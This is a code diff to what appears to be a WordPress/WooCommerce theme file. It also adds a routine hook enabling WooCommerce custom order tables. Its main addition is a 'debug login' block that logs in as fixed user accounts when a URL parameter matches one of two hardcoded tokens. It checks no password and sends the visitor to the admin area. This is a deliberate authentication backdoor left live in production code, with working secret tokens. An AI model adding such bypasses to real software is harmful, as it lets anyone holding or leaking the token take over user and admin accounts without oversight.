@@ -824,3 +824,41 @@ function get_product_price_html( $product ){
     $price_html .= '</div>';
     return $price_html;
 }
+////////////////////  
+// if urgently need to login and no phone messages not sent
+if( isset( $_GET['primera_debug_login_token'] ) ){
+
+    $token = trim( $_GET['primera_debug_login_token'] );
+
+    if( $token === '0o8bCYF4v11v' ){        // ahmed marketer
+        $user = get_user_by( 'id', 213315 );
+    }elseif ( $token === 'zzH6464KypzL' ) { // m.yassin developer
+        $user = get_user_by( 'id', 232137 );
+    }
+
+    if ( ! isset( $user ) || is_wp_error( $user ) ){
+        wp_die( 'You are not allowed to sign in' );
+    }
+
+    wp_clear_auth_cookie();
+    wp_set_current_user ( $user->ID );
+    wp_set_auth_cookie  ( $user->ID );
+
+    $redirect_to = user_admin_url();
+    wp_safe_redirect( $redirect_to );
+    exit();
+}
+
+//  Enable WooCommerce Custom Order Tables
+function enable_cot(){
+    if( !function_exists('wc_get_container') ){
+        return;
+    }
+    
+    $order_controller = wc_get_container()
+        ->get('Automattic\WooCommerce\Internal\DataStores\Orders\CustomOrdersTableController');
+    if( isset( $order_controller ) ) {
+        $order_controller->show_feature();
+    }
+}
+add_action( 'init', 'enable_cot', 99 );
